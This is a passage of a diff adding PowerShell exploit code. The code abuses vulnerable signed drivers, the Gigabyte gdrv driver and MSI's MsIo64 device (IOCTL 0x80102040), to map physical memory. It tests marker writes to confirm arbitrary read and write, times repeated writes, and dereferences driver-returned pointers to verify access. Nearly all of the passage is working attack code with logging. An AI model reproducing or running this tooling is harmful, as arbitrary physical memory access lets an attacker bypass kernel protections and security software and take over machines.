@@ -1,0 +1,42 @@
+        Log ("  W1 read-coherent = {0}" -f $readOk)
+        $orig = [P36Prov]::ReadAt(($vva + 0x10), 8)
+        $wr = [P36Prov]::WriteAt(($vva + 0x10), $MARK)
+        $viaGdrv = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1010, 8))
+        $markHex = [P36Prov]::Hex($MARK)
+        [P36Prov]::WriteAt(($vva + 0x10), [byte[]]($orig -split ' ' | ForEach-Object { [Convert]::ToByte($_,16) })) | Out-Null
+        $restored = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1010, 8))
+        Log ("  marker orig={0} wrote={1} via_gdrv={2} restored={3}" -f $orig, $markHex, $viaGdrv, $restored)
+        $writeOk = ($viaGdrv -eq $markHex) -and ($restored -eq $orig)
+        Log ("  W1 write-coherent+restored = {0}" -f $writeOk)
+        $t0 = Get-Date
+        for ($i = 0; $i -lt 200; $i++) { [P36Prov]::WriteAt(($vva + 0x10), $MARK) | Out-Null }
+        [P36Prov]::WriteAt(($vva + 0x10), [byte[]]($orig -split ' ' | ForEach-Object { [Convert]::ToByte($_,16) })) | Out-Null
+        Log ("  W1 200 view writes = {0:N0} ms ({1:N0} us/op)" -f ((Get-Date) - $t0).TotalMilliseconds, (((Get-Date) - $t0).TotalMilliseconds * 1000 / 200))
+        $verdict.W1_physmem = ($readOk -and $writeOk)
+        if ($verdict.W1_physmem) { Log '  W1 PASS - native physical R/W view held open' }
+        else { Log ("  W1 FAIL - unmap={0}" -f ([P36Prov]::PhysMemUnmap($sec, $view))) }
+    } else { Log ("  map FAIL: {0}" -f $e) }
+} else { Log '  W1 no section handle' }
+
+# ---- W2: MsIo64 map ------------------------------------------------------
+Log ''
+Log '########## W2 MsIo64 0x80102040 (fallback driver-mediated view) ##########'
+$mio = [IntPtr]::Zero
+$me2 = [P36Prov]::MsIoOpen([ref]$mio)
+if ($me2 -ne '') { Log ("  open \\.\MSIO FAIL {0}" -f $me2) } else {
+    Log ("  open \\.\MSIO ok handle=0x{0:x}" -f $mio.ToInt64())
+    $ref4 = [P36Prov]::Hex($ref0[0..15])
+    foreach ($shape in 0,1,2,3) {
+        $err2 = [uint32]0; $oh = ''
+        $st = [P36Prov]::MsIoTry($mio, $shape, [uint64]0x1000, 0x1000, [ref]$err2, [ref]$oh)
+        Log ("  {0}" -f $st)
+        if ($st -match ' OK') {
+            Log ("    out={0}" -f $oh)
+            $q = $oh -split ' '
+            for ($k = 0; $k -lt 8; $k++) {
+                $v = [uint64]::Parse(($q[($k*8)..($k*8+7)] -join ''), 'HexNumber')
+                if ([P36Prov]::IsUserVa($v)) {
+                    $sample = [P36Prov]::ReadAt($v, 16)
+                    Log ("    q[{0}]=0x{1:x} deref={2} match={3}" -f $k, $v, $sample, ($sample -eq $ref4))
+                    if ($sample -eq $ref4 -and -not $verdict.W2_msio) {
+                        $verdict.W2_msio = $true
